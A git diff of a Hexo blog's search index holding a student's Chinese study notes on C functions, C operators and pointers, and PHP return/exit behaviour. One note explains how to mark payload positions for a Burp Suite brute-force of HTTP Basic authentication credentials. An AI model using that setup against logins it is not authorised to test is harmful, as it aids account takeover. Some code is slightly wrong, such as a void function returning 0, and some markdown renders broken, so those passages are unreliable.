@@ -1,6 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>我的第一篇博客</title>
+    <url>/2025/01/11/25.1.9/</url>
+    <content><![CDATA[<h3 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h3><p>第一次写博客,这是一个测试</p>
+]]></content>
+  </entry>
+  <entry>
     <title>HCTF2018 WarmUp1代码审计:include分割符</title>
     <url>/2025/01/14/2018-WarmUp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-include%E5%88%86%E5%89%B2%E7%AC%A6/</url>
     <content><![CDATA[<h3 id="HCTF2018-Warmup1-代码审计"><a href="#HCTF2018-Warmup1-代码审计" class="headerlink" title="HCTF2018 Warmup1 代码审计"></a>HCTF2018 Warmup1 代码审计</h3><h4 id="第一步-查看源码"><a href="#第一步-查看源码" class="headerlink" title="第一步:查看源码"></a>第一步:查看源码</h4>
@@ -92,12 +98,6 @@
       <tags>
         <tag>文件上传</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>我的第一篇博客</title>
-    <url>/2025/01/11/25.1.9/</url>
-    <content><![CDATA[<h3 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h3><p>第一次写博客,这是一个测试</p>
-]]></content>
   </entry>
   <entry>
     <title>Arch_linux入门</title>
@@ -364,6 +364,49 @@
       </categories>
       <tags>
         <tag>ollama</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bp爆破中的变量赋值</title>
+    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
+    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
+<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
+<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
+<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
+<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>bp爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>c语言函数的调用</title>
+    <url>/2025/01/16/c%E8%AF%ADy%E8%A8%80%E5%AD%A6%E4%B9%A01/</url>
+    <content><![CDATA[<h3 id="c语言函数的调用"><a href="#c语言函数的调用" class="headerlink" title="c语言函数的调用"></a>c语言函数的调用</h3><h4 id="c语言函数调用的步奏"><a href="#c语言函数调用的步奏" class="headerlink" title="c语言函数调用的步奏"></a>c语言函数调用的步奏</h4><h5 id="首先-声明函数"><a href="#首先-声明函数" class="headerlink" title="首先,声明函数"></a>首先,声明函数</h5><p>声明函数在mian函数外进行完成.</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jolly</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">deny</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="其次调用函数"><a href="#其次调用函数" class="headerlink" title="其次调用函数"></a>其次调用函数</h5><p>调用直接在main函数内使用函数名称加小括号的方式完成。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	jolly();</span><br><span class="line">	deny();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="最后对函数进行定义"><a href="#最后对函数进行定义" class="headerlink" title="最后对函数进行定义"></a>最后对函数进行定义</h5><p>定义在main函数外进行完成</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">jolly</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For he&#x27;s a jolly good fellow!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For he&#x27;s a jolly good fellow!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For he&#x27;s a jolly good fellow!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">deny</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Which is nobody can deny&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.首先声明函数</p>
+<p>2.其次在main内调用函数</p>
+<p>3.最后定义函数</p>
+<p>4.函数执行的位置取决于你在哪里调用函数而非定义</p>
+]]></content>
+      <categories>
+        <category>c语言</category>
+      </categories>
+      <tags>
+        <tag>c语言函数</tag>
       </tags>
   </entry>
   <entry>
@@ -1047,54 +1090,6 @@
       </tags>
   </entry>
   <entry>
-    <title>c语言函数的调用</title>
-    <url>/2025/01/16/c%E8%AF%ADy%E8%A8%80%E5%AD%A6%E4%B9%A01/</url>
-    <content><![CDATA[<h3 id="c语言函数的调用"><a href="#c语言函数的调用" class="headerlink" title="c语言函数的调用"></a>c语言函数的调用</h3><h4 id="c语言函数调用的步奏"><a href="#c语言函数调用的步奏" class="headerlink" title="c语言函数调用的步奏"></a>c语言函数调用的步奏</h4><h5 id="首先-声明函数"><a href="#首先-声明函数" class="headerlink" title="首先,声明函数"></a>首先,声明函数</h5><p>声明函数在mian函数外进行完成.</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jolly</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">deny</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>
-
-<h5 id="其次调用函数"><a href="#其次调用函数" class="headerlink" title="其次调用函数"></a>其次调用函数</h5><p>调用直接在main函数内使用函数名称加小括号的方式完成。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	jolly();</span><br><span class="line">	deny();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="最后对函数进行定义"><a href="#最后对函数进行定义" class="headerlink" title="最后对函数进行定义"></a>最后对函数进行定义</h5><p>定义在main函数外进行完成</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">jolly</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For he&#x27;s a jolly good fellow!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For he&#x27;s a jolly good fellow!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For he&#x27;s a jolly good fellow!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">deny</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Which is nobody can deny&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.首先声明函数</p>
-<p>2.其次在main内调用函数</p>
-<p>3.最后定义函数</p>
-<p>4.函数执行的位置取决于你在哪里调用函数而非定义</p>
-]]></content>
-      <categories>
-        <category>c语言</category>
-      </categories>
-      <tags>
-        <tag>c语言函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bp爆破中的变量赋值</title>
-    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
-    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
-<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
-<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
-<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
-<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>bp爆破</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>c语言操作题</title>
-    <url>/2025/03/02/c%E8%AF%AD%E8%A8%80%E6%93%8D%E4%BD%9C%E9%A2%98/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>c语言数值类型与字长的理解</title>
     <url>/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="c语言数据类型"><a href="#c语言数据类型" class="headerlink" title="c语言数据类型"></a>c语言数据类型</h2><h3 id="数据声明与字长"><a href="#数据声明与字长" class="headerlink" title="数据声明与字长"></a>数据声明与字长</h3><p>1.首先字长是计算机可以处理的二进制数的位数,字节是基本单位,一字节等于8位,1位是0或1。</p>
@@ -1260,9 +1255,42 @@
       </tags>
   </entry>
   <entry>
+    <title>c语言操作题</title>
+    <url>/2025/03/02/c%E8%AF%AD%E8%A8%80%E6%93%8D%E4%BD%9C%E9%A2%98/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>c语言细节</title>
     <url>/2025/02/08/c%E8%AF%AD%E8%A8%80%E7%BB%86%E8%8A%82/</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>if代码执行机制</title>
+    <url>/2025/01/14/if%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h3 id="这里我们总结if代码块中布尔值的多少对程序进程的影响"><a href="#这里我们总结if代码块中布尔值的多少对程序进程的影响" class="headerlink" title="这里我们总结if代码块中布尔值的多少对程序进程的影响"></a>这里我们总结if代码块中布尔值的多少对程序进程的影响</h3><h4 id="if条件小括号内的情况"><a href="#if条件小括号内的情况" class="headerlink" title="if条件小括号内的情况"></a>if条件小括号内的情况</h4><h5 id="if括号内为false"><a href="#if括号内为false" class="headerlink" title="if括号内为false"></a>if括号内为false</h5><p>毫无疑问,if代码块里面的代码不会继续运行,此时整个程序会跳过条件括号里为false的这个if代码块继续往下运行。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This will be printed because the if condition was false&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>在上述代码中，因为 if 条件为 false，echo “This will not be printed”; 不会被执行，程序直接执行 echo “This will be printed because the if condition was false”。</p>
+<h5 id="if括号里为true"><a href="#if括号里为true" class="headerlink" title="if括号里为true"></a>if括号里为true</h5><p>当 if 括号内条件为 true 时，if 代码块内的代码会执行。但这并不意味着整个程序会不受影响地继续运行。<br>取决于 if 代码块内的代码：<br>如果 if 代码块内有 return、exit 或 die 等终止程序或函数的语句，程序或函数的执行会被终止。<br>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This will be printed&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed because of the return statement&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
+<p>在这种情况下,if代码块内因为有return,所以在同一函数代码空间的echo语句不会被执行。也就是在这一层代码空间内，程序的运行确实被终止了。<br>这就引出了我们接下来要说的一种情况:</p>
+<h4 id="return的辨析"><a href="#return的辨析" class="headerlink" title="return的辨析"></a>return的辨析</h4><p>其实我们在这里可以把return,die,exit这几个对程序运行都有影响的一起说了。<br>1.首先是return，它在,不管是返回什么布尔值,都会使<strong>同一空间代码</strong>停止运行,<br>如果在函数内,它就会使return之后的代码无法运行,如果在类中,也是一样，而我们不推荐把它放在全局代码空间中,这样会使得整个程序停止运行。<br>例如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Before return&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里的条件可以根据需要修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;After return&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
+<p>在函数外依然可以调用这个函数,函数外并没有因为前面函数里面有return而被打断,但是这里就只会<br>输出:Before return,不会输出After return<br>在类,即对象class里面情况类似</p>
+<p>在文件包含的情况下:<br>在被包含文件:”included_file.php”内:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Before return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再在另外一个文件中包含它:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;included_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is after including the file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只会输出:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before return in included file</span><br><span class="line">This is after including the file</span><br></pre></td></tr></table></figure>
+<p>即:在被包含文件自己代码中,return后面的After return in included file没有输出，程序终止。<br>但是并没有影响去包含这个文件的主文件在后方的”This is after including the file”这句话的输出,<br>所以在文件包含的情景下,return也只会终止自己文件后方的代码，对主文件没有影响。</p>
+<p>2.而die,exit则会直接使整个程序不可运行,没有代码空间的说法。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php条件函数</tag>
+      </tags>
   </entry>
   <entry>
     <title>c语言选择题</title>
@@ -1274,8 +1302,13 @@
 <li><p>记住:一定要有分号,赋值末尾</p>
 <p>该语句<code>i++</code>为合法赋值语句:相当于<code>i = i + 1</code></p>
 </li>
-<li><p>强制类型转换:</p>
+<li><p>赋值运算符从右到左，赋值号左边：**代表某个存储单元的变量名，**右边：<strong>C语言中合法的表达式</strong>。</p>
 </li>
+<li><p>比如：</p>
+</li>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250323152602430.png" class="" title="image-20250323152602430"></li>
+</ul>
+<h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换:"></a>强制类型转换:</h3><ul>
 <li><p>在 C 语言中，强制类型转换是通过类型转换运算来实现的，其一般形式为：（类型说明符）(表达式) ，功能是把表达式的运算结果强制转换成类型说明符所表示的类型。</p>
 <ul>
 <li><p><strong>示例</strong>：<code>(float)a</code>可把变量<code>a</code>转换为浮点型；<code>(int)(x + y)</code>会把<code>x + y</code>的结果转换为整型。</p>
@@ -1303,10 +1336,11 @@
 </ul>
 <p>此外，在函数的参数传递、返回值处理，以及单片机或 Linux 驱动开发中的寄存器地址使用等场景，也常需要进行强制类型转换。</p>
 <h4 id="双等号赋值"><a href="#双等号赋值" class="headerlink" title="双等号赋值:"></a>双等号赋值:</h4><p><code>sum = pad =5</code>，5同时给<code>sum</code>和<code>pad</code>两个值赋值。</p>
-<h3 id="自增运算"><a href="#自增运算" class="headerlink" title="自增运算"></a>自增运算</h3><p>例题一:</p>
-<ul>
-<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250302145908381.png" class="" title="image-20250302145908381"></li>
+</li>
 </ul>
+<h3 id="自增运算"><a href="#自增运算" class="headerlink" title="自增运算"></a>自增运算</h3><p>  例题一:</p>
+<ul>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250302145908381.png" class="" title="image-20250302145908381">
 </li>
 <li><p>在 C 语言中，<code>pAd++</code>和<code>++pAd</code>都属于自增运算符，但使用方式和效果有所不同：</p>
 <ul>
@@ -1322,8 +1356,16 @@
 <li>在这题中:</li>
 <li>先让<code>pAd</code>的值被赋值为<code>sum</code>的值(5),然后<code>sum</code>自己再增加1,</li>
 <li>后方就是pAd的变化，与pad无关</li>
-<li><strong>并且c语言要区分大小</strong></li>
+<li><strong>并且c语言要区分大小写</strong></li>
 </ul>
+</li>
+<li><p>例题2：</p>
+</li>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250323163302391.png" class="" title="image-20250323163302391">
+</li>
+<li><p>这里最难的就是：<code>return</code>的时候，<code>++</code>后自增运算符也会起作用，这里体现自增运算符功能如下：</p>
+</li>
+<li><p>在第二个<code>data=change(&amp;data)</code>中，<code>data</code>值为<code>124</code>,而在函数中，<code>return(*data)++</code>这个表达式的含义是:<strong>先将data指针解包后的数据返回，即给变量赋值后，再自增1</strong>，所以在这里，<code>data</code>得到的值为<code>124</code>,即函数先进行了<code>return</code>的运算，之后<code>*data</code>再自增1，变为<code>125</code>，但是变量<code>data</code>的值为<code>124</code>。</p>
 </li>
 </ul>
 <h3 id="整型表达式"><a href="#整型表达式" class="headerlink" title="整型表达式"></a>整型表达式</h3><ul>
@@ -1386,7 +1428,7 @@
 </li>
 <li><ul>
 <li><p>在 C 语言中，<code>%</code>是取模运算符，用于计算两个整数相除后的余数 ，其运算规则为：<code>a % b</code>（<code>a</code>、<code>b</code> 为整数，<code>b≠0</code>）的结果是 <code>a</code> 除以 <code>b</code> 得到商后剩下的余数。</p>
-<p>对于<code>2 % 9</code>，<code>2</code>除以<code>9</code>，因为<code>2</code>小于<code>9</code>，不够除，此时商为<code>0</code> ，根据 “余数 &#x3D; 被除数 - 商 × 除数” 的公式，即<code>2 - 0×9 = 2</code> ，所以<code>2 % 9</code>的结果是<code>2</code>。</p>
+<p>对于<code>2 % 9</code>，<code>2</code>除以<code>9</code>，因为<code>2</code>小于<code>9</code>，不够除，此时商为<code>0</code> ，根据 “余数 &#x3D; 被除数 - 商 × 除数” 的公式，即<code>2 - 0×9 = 2</code> ，所以<code>2 % 9</code>的结果是<code>2</code>。<strong>这里太重要了</strong></p>
 </li>
 <li><p><strong>记住:商为0的时候，余数就为被除数（这里是2）它本身</strong></p>
 </li>
@@ -1399,19 +1441,87 @@
 <li><p>如</p>
 </li>
 <li><pre><code class="language-c">b = (-1)&amp;&amp;(-1)
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 这种情况下,`b`值为`1`(True)。</span><br><span class="line"></span><br><span class="line">##### 位运算符</span><br><span class="line"></span><br><span class="line">* 例子:</span><br><span class="line"></span><br><span class="line">* 假设两个十进制数 A = 10，B = 5，来看看它们进行异或运算的过程：</span><br><span class="line"></span><br><span class="line">  1. 先将它们转换为二进制数，10 的二进制是 `0000 1010`，5 的二进制是 `0000 0101`。</span><br><span class="line">  2. 然后按照异或运算规则逐位运算：</span><br><span class="line">     - 第 1 位（从右往左）：`0 ^ 1 = 1`；</span><br><span class="line">     - 第 2 位：`1 ^ 0 = 1`；</span><br><span class="line">     - 第 3 位：`0 ^ 1 = 1`；</span><br><span class="line">     - 第 4 位：`1 ^ 0 = 1`；</span><br><span class="line">     - 第 5 - 8 位：`0 ^ 0 = 0`。</span><br><span class="line">  3. 得到的结果是 `0000 1111`，转换为十进制就是 15 。</span><br><span class="line"></span><br><span class="line">  再比如，设 C = 8（二进制为 `0000 1000`），D = 8（二进制为 `0000 1000`），它们进行异或运算时，逐位对比：</span><br><span class="line"></span><br><span class="line">  - 每一位都是相同的数字，按照规则 `0 ^ 0 = 0`，`1 ^ 1 = 0`，所以结果是 `0000 0000`，即十进制的 0。</span><br><span class="line"></span><br><span class="line">* 什么时候判别位`0`,什么时候判别为`1`呢？</span><br><span class="line"></span><br><span class="line">* 具体来说</span><br><span class="line"></span><br><span class="line">* * **结果为0的情况：**在对应的两位数字相同的时候，如`1^1`或者`0^0`的时候返回值为0</span><br><span class="line">  * **结果为1的情况：**当两个相应位的值不同时，异或运算结果为 1</span><br><span class="line"></span><br><span class="line">##### 有关运算顺序</span><br><span class="line"></span><br><span class="line">* 该例题可以说明情况:</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20250320185440030.png image-20250320185440030 %&#125;</span><br><span class="line"></span><br><span class="line">### 指针</span><br><span class="line"></span><br><span class="line">#### 基础</span><br><span class="line"></span><br><span class="line">* 简单来说指针:`p`,就是对一个变量进行指向，让我们后续找到这个变量更加方便</span><br><span class="line"></span><br><span class="line">* `*p`就是解析指针,`p`就是直接输出指针的值,`&amp;`就是对一个变量的地址进行抓取。</span><br><span class="line"></span><br><span class="line">* 如下:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  </span><br><span class="line">  int main()&#123;</span><br><span class="line">      int a = 6;</span><br><span class="line">      int * p;</span><br><span class="line">      char * pi;</span><br><span class="line">  </span><br><span class="line">      p = &amp;a;</span><br><span class="line">      printf(&quot;%d, %d\n&quot;, *p, p); // prints the address of a; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 这种情况下,`b`值为`1`(True)。</span><br><span class="line"></span><br><span class="line">###### 例子</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int fun(char *s, char *t) &#123;</span><br><span class="line">    while ((*s) &amp;&amp; (*t) &amp;&amp; (*t++ == *s++));//这里是先将t和s所指向的第一个字符进行比较之后再后移一位。</span><br><span class="line">    return (*s - *t);//返回两后移一位的字符的ASCII🐎的差值。所以是在比较大小。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </code></pre>
 </li>
-<li><p>会分别输出:<code>6</code>和<code>6291076</code>,前者就是变量具体的值，后者是其地址的值。</p>
+</ul>
+<h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><ul>
+<li><p>有关异或运算符<code>^</code>的例子:</p>
 </li>
-<li><p>指针的用法就是对一个变量的地址进行追踪:</p>
+<li><p>假设两个十进制数 A &#x3D; 10，B &#x3D; 5，来看看它们进行异或运算的过程：</p>
+<ol>
+<li>先将它们转换为二进制数，10 的二进制是 <code>0000 1010</code>，5 的二进制是 <code>0000 0101</code>。</li>
+<li>然后按照异或运算规则逐位运算：<ul>
+<li>第 1 位（从右往左）：<code>0 ^ 1 = 1</code>；</li>
+<li>第 2 位：<code>1 ^ 0 = 1</code>；</li>
+<li>第 3 位：<code>0 ^ 1 = 1</code>；</li>
+<li>第 4 位：<code>1 ^ 0 = 1</code>；</li>
+<li>第 5 - 8 位：<code>0 ^ 0 = 0</code>。</li>
+</ul>
 </li>
-<li><p><code>p = &amp;a</code>,然后<code>*p</code>和<code>p</code>分别是对指针解析与不解析，解析了就为变量具体值，不解析就为地址值,指针的存在方便我们去最总一个变量，修改变量的值。</p>
+<li>得到的结果是 <code>0000 1111</code>，转换为十进制就是 15 。</li>
+</ol>
+<p>再比如，设 C &#x3D; 8（二进制为 <code>0000 1000</code>），D &#x3D; 8（二进制为 <code>0000 1000</code>），它们进行异或运算时，逐位对比：</p>
+<ul>
+<li>每一位都是相同的数字，按照规则 <code>0 ^ 0 = 0</code>，<code>1 ^ 1 = 0</code>，所以结果是 <code>0000 0000</code>，即十进制的 0。</li>
+</ul>
 </li>
-<li><p>比如:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    <span class="type">int</span> * p;</span><br><span class="line">    <span class="type">char</span> * pi;</span><br><span class="line"></span><br><span class="line">    p =  &amp;a;</span><br><span class="line"></span><br><span class="line">    *p = <span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<li><p>什么时候判别位<code>0</code>,什么时候判别为<code>1</code>呢？</p>
+</li>
+<li><p>具体来说</p>
+</li>
+<li><ul>
+<li>**结果为0的情况：**在对应的两位数字相同的时候，如<code>1^1</code>或者<code>0^0</code>的时候返回值为0</li>
+<li>**结果为1的情况：**当两个相应位的值不同时，异或运算结果为 1</li>
+</ul>
+</li>
+<li><p>更多位运算符请详见<a href="https://www.runoob.com/cprogramming/c-operators.html">菜鸟教程——C运算符</a></p>
+</li>
+</ul>
+<h5 id="有关运算顺序"><a href="#有关运算顺序" class="headerlink" title="有关运算顺序"></a>有关运算顺序</h5><ul>
+<li>该例题可以说明情况:</li>
+</ul>
+<img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250320185440030.png" class="" title="image-20250320185440030">
+
+<h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><h4 id="基础1"><a href="#基础1" class="headerlink" title="基础1"></a>基础1</h4><ul>
+<li><p>简单来说指针:<code>p</code>,就是对一个变量进行指向，让我们后续找到这个变量更加方便</p>
+</li>
+<li><p><code>*p</code>就是解析指针,<code>p</code>就是直接输出指针的值,<code>&amp;</code>就是对一个变量的地址进行抓取。</p>
+</li>
+<li><p>如下:</p>
+</li>
+<li><pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main()&#123;
+    int a = 6;
+    int * p;
+    char * pi;
+
+    p = &amp;a;
+    printf(&quot;%d, %d\n&quot;, *p, p); // prints the address of a; 
+&#125;
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 会分别输出:`6`和`6291076`,前者就是变量具体的值，后者是其地址的值。</span><br><span class="line"></span><br><span class="line">* 指针的用法就是对一个变量的地址进行追踪:</span><br><span class="line"></span><br><span class="line">* `p = &amp;a`,然后`*p`和`p`分别是对指针解析与不解析，解析了就为变量具体值，不解析就为地址值,指针的存在方便我们去最总一个变量，修改变量的值。</span><br><span class="line"></span><br><span class="line">* 比如:</span><br><span class="line"></span><br><span class="line">  ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  </span><br><span class="line">  int main()&#123;</span><br><span class="line">      int a = 6;</span><br><span class="line">      int * p;</span><br><span class="line">      char * pi;</span><br><span class="line">  </span><br><span class="line">      p =  &amp;a;</span><br><span class="line">  </span><br><span class="line">      *p = 7;</span><br><span class="line">      